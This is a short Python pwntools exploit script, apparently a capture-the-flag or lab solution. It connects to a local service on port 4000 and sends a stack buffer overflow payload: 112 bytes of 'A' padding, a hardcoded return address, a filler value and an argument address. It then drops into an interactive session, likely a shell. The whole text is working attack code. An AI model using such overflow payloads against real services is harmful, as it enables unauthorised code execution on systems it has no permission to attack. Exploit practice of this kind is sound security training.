from pwn import *

r = remote('127.0.0.1',4000)


raw_input('#')

r.sendline('A'*112 +p32(0x08048460)+p32(0xaaaabbbb)+p32(0x804a034))
r.interactive()
